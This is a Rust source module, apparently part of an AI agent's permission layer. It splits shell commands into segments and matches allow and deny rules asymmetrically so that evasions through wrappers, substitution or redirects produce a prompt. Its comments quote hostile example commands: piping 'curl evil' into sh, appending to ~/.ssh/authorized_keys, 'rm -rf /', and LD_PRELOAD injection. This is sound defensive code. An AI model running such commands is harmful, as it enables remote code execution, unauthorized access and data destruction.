//! Shell-command program extraction and asymmetric allow/deny rule
//! matching, split out of `permissions`; logic unchanged.

use serde_json::Value;

use super::MatchMode;

/// Program name of a shell command: the first whitespace-delimited word with
/// any leading path stripped, so `/usr/bin/git` and `git` share one rule. Used
/// only to NAME the persisted rule; matching uses [`shell_program_segments`].
pub(super) fn shell_program(args: &Value) -> Option<String> {
    let cmd = args
        .get("command")
        .or_else(|| args.get("cmd"))
        .and_then(|v| v.as_str())?;
    let first = cmd.split_whitespace().next()?;
    let prog = first.rsplit('/').next().unwrap_or(first);
    (!prog.is_empty()).then(|| prog.to_string())
}

/// Split a shell command on its control operators (`;`, `&&`, `||`, `|`, `&`,
/// newline) into non-empty segments. Splitting on the single chars `&`/`|` turns
/// `&&`/`||` into empty fragments, which are filtered out.
///
/// This is a best-effort token scan, NOT a shell parser: command substitution
/// (`$(…)`, backticks, `<(…)`) and `eval`/`sh -c '…'` payloads are not parsed.
/// Matching compensates asymmetrically (deny is broad, allow is narrow) so the
/// gaps degrade to a prompt, never to a silent auto-run.
fn shell_segments(cmd: &str) -> Vec<&str> {
    cmd.split([';', '|', '&', '\n'])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .collect()
}

/// Program name of a shell word: quote chars removed, then the basename, so
/// `"rm"`, `r''m`, `/bin/rm`, `'sudo'` all resolve to the program that actually
/// runs. Mirrors the danger classifier's `shell_token_command_name` so the deny
/// list and the danger gate agree on what a word executes.
fn program_name(word: &str) -> String {
    let literal = normalize_shell_scan(word);
    let literal = literal.split_whitespace().next().unwrap_or("");
    let literal: String = literal
        .chars()
        .filter(|c| !matches!(c, '"' | '\''))
        .collect();
    // The shell separates a glued redirect (`curl>out`, `rm<x`) into the program
    // plus a redirection even without surrounding spaces, so the program a word
    // runs ends at the first `<`/`>`. Stop there before taking the basename.
    let literal = literal.split(['<', '>']).next().unwrap_or("");
    literal.rsplit('/').next().unwrap_or("").to_string()
}

fn normalize_shell_scan(input: &str) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::with_capacity(input.len());
    let mut i = 0usize;
    while i < chars.len() {
        match chars[i] {
            '\\' => {
                if let Some(next) = chars.get(i + 1) {
                    out.push(*next);
                    i += 2;
                } else {
                    i += 1;
                }
            }
            '\'' => {
                out.push('\'');
                i += 1;
                while let Some(ch) = chars.get(i) {
                    out.push(*ch);
                    i += 1;
                    if *ch == '\'' {
                        break;
                    }
                }
            }
            '"' => i += 1,
            '$' => i = push_shell_param(&chars, i, &mut out),
            ch => {
                out.push(ch);
                i += 1;
            }
        }
    }
    out
}

fn push_shell_param(chars: &[char], dollar: usize, out: &mut String) -> usize {
    let next = dollar + 1;
    if chars.get(next) == Some(&'{') {
        if let Some(end) = chars
            .iter()
            .enumerate()
            .skip(next + 1)
            .find_map(|(i, ch)| (*ch == '}').then_some(i))
        {
            let body: String = chars[next + 1..end].iter().collect();
            let name: String = body
                .chars()
                .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
                .collect();
            if name.eq_ignore_ascii_case("ifs") {
                out.push(' ');
            } else if !body.contains(':') && !name.is_empty() {
                out.push('$');
                out.push_str(&name);
            }
            return end + 1;
        }
    }
    let name_end = chars
        .iter()
        .enumerate()
        .skip(next)
        .find_map(|(i, ch)| (!ch.is_ascii_alphanumeric() && *ch != '_').then_some(i))
        .unwrap_or(chars.len());
    if name_end == next {
        out.push('$');
        return next;
    }
    let name: String = chars[next..name_end].iter().collect();
    if name.eq_ignore_ascii_case("ifs") {
        out.push(' ');
    } else {
        out.push('$');
        out.push_str(&name);
    }
    name_end
}

/// Program candidates one segment runs, peeling wrapper/interpreter prefixes:
/// `sudo rm` → `["sudo", "rm"]`, `cargo build` → `["cargo"]`. Skips leading
/// `VAR=val` assignments and a peeled wrapper's immediate `-flags`. The chain
/// ends at the first non-wrapper program.
fn segment_programs(segment: &str) -> Vec<&str> {
    let mut words = segment.split_whitespace().peekable();
    while words.peek().is_some_and(|w| is_assignment(w)) {
        words.next();
    }
    let mut out = Vec::new();
    while let Some(w) = words.next() {
        let base = w.rsplit('/').next().unwrap_or(w);
        if base.is_empty() {
            continue;
        }
        out.push(base);
        if is_wrapper(base) {
            while words.peek().is_some_and(|n| n.starts_with('-')) {
                words.next();
            }
            continue; // keep peeling to reach the wrapped program
        }
        break;
    }
    out
}

/// Program candidates one segment runs for a DENY match — intentionally broad.
/// Beyond the leading program it treats every later non-flag word as a
/// candidate *once a wrapper has been seen*, because the wrapped program can sit
/// behind a value-bearing flag (`sudo -u root rm`) or a positional argument
/// (`timeout 5 rm`) that `segment_programs` mistakes for the program. Quotes are
/// stripped via [`program_name`] so `"rm"`/`r''m` are caught too. A bare denied
/// name passed as an argument to a wrapper (`sudo grep rm f`) may over-match,
/// but deny erring broad only ever costs an extra prompt, never a silent run.
fn segment_deny_programs(segment: &str) -> Vec<String> {
    let mut words = segment.split_whitespace().peekable();
    while words.peek().is_some_and(|w| is_assignment(w)) {
        words.next();
    }
    let mut out = Vec::new();
    let mut saw_wrapper = false;
    for w in words {
        if w.starts_with('-') {
            continue; // a flag, or a flag's value we can't see — skip
        }
        if is_shell_keyword(w) {
            continue; // `do`/`then`/… body keyword — the real program follows it
        }
        let base = program_name(w);
        if base.is_empty() {
            continue;
        }
        let wrap = is_wrapper(&base);
        out.push(base);
        if wrap {
            saw_wrapper = true;
        } else if !saw_wrapper {
            break; // no wrapper seen: only the leading program runs
        }
    }
    out
}

/// `NAME=value` env-assignment prefix (a valid shell identifier before `=`).
fn is_assignment(w: &str) -> bool {
    match w.split_once('=') {
        Some((name, _)) => {
            !name.is_empty()
                && name
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        }
        None => false,
    }
}

/// Shell loop/conditional body keywords. A denied program can hide behind one
/// — `for f in *; do rm $f; done` splits into a `do rm $f` segment whose first
/// word is `do`, not `rm` — so the broad deny scanner skips them like flags to
/// reach the program that actually runs. Deny-only: erring broad just adds a
/// prompt, never a silent run.
fn is_shell_keyword(word: &str) -> bool {
    const KEYWORDS: &[&str] = &["do", "then", "else", "elif", "in", "done", "fi", "esac"];
    KEYWORDS.contains(&word)
}

/// Programs that run *another* program given to them (wrappers/interpreters).
/// Their presence means the segment's first word doesn't reveal what actually
/// runs, so an allow rule must not auto-run such a command.
fn is_wrapper(prog: &str) -> bool {
    const WRAPPERS: &[&str] = &[
        "sudo", "doas", "env", "command", "nohup", "time", "timeout", "xargs", "nice", "ionice",
        "stdbuf", "setsid", "watch", "script", "exec", "eval", "sh", "bash", "zsh", "dash", "ksh",
        "fish",
    ];
    WRAPPERS.contains(&prog)
}

/// Command substitution / process substitution that could run a hidden program.
fn has_substitution(cmd: &str) -> bool {
    cmd.contains("$(") || cmd.contains('`') || cmd.contains("<(") || cmd.contains(">(")
}

/// I/O redirection (`>`, `>>`, `<`, `2>`, `&>`, …). `shell_segments` splits on
/// `; | & \n` but NOT on redirects, so `echo X > ~/.ssh/authorized_keys` is a
/// single segment whose only program is `echo` — it would otherwise satisfy an
/// `echo:*` allow rule and silently write out of tree. Allow rules degrade to a
/// prompt whenever a redirect is present; the redirect target is invisible to
/// the program-name scanner, so it must never be auto-run.
fn has_redirect(cmd: &str) -> bool {
    cmd.contains('>') || cmd.contains('<')
}

/// Match a `run_shell(<prog>:*)` rule against a command, asymmetrically:
///   - **Deny**: matches if ANY segment runs `<prog>` — so `rm:*` still blocks
///     `sudo rm`, `x; rm -rf /`, `a && rm`, `find . | rm`.
///   - **Allow**: matches only if the command is "clean" — every segment runs
///     `<prog>`, no wrapper/interpreter (`sudo`, `bash -c`, …) and no command
///     substitution. Anything else falls through to a prompt instead of being
///     silently auto-run (e.g. `cargo build; curl evil | sh` is NOT auto-run by
///     `cargo:*`).
pub(super) fn run_shell_rule_matches(prog: &str, args: &Value, mode: MatchMode) -> bool {
    let Some(cmd) = args
        .get("command")
        .or_else(|| args.get("cmd"))
        .and_then(|v| v.as_str())
    else {
        return false;
    };
    match mode {
        // Broad: any program any segment runs (wrappers peeled, quotes stripped,
        // every post-wrapper word scanned) matches. Command/process substitution
        // and subshells are first exploded into separate segments so a hidden
        // `$(rm …)`, `` `rm …` `` or `(rm …)` is still seen — deny must catch
        // what the danger classifier (shell_token_command_name) catches.
        MatchMode::Deny => {
            // Explode subshells `(…)`, brace groups `{…}`, and command/backtick
            // substitution into separate segments so a hidden `(rm …)`,
            // `{ rm …; }`, `$(rm …)` or `` `rm …` `` is still seen.
            let exposed = cmd.replace(['(', ')', '`', '{', '}'], "\n");
            [cmd, exposed.as_str()].iter().any(|source| {
                shell_segments(source).iter().any(|seg| {
                    segment_deny_programs(seg)
                        .iter()
                        .any(|p| p.as_str() == prog)
                })
            })
        }
        // Narrow: every segment must run exactly `prog` with no wrapper, no
        // command substitution, no I/O redirection, and no leading `VAR=val`
        // env-assignment prefix, else fall through to a prompt.
        MatchMode::Allow => {
            let segments = shell_segments(cmd);
            !segments.is_empty()
                && segments.iter().all(|seg| {
                    let chain = segment_programs(seg);
                    chain.len() == 1
                        && chain[0] == prog
                        // A leading `VAR=val` prefix injects environment
                        // (LD_PRELOAD, PATH, GIT_SSH_COMMAND, …) into the
                        // auto-run program. segment_programs peels it, so the
                        // program-name match can't see it — never auto-run one.
                        && !seg.split_whitespace().next().is_some_and(is_assignment)
                })
                && !has_substitution(cmd)
                && !has_redirect(cmd)
        }
    }
}
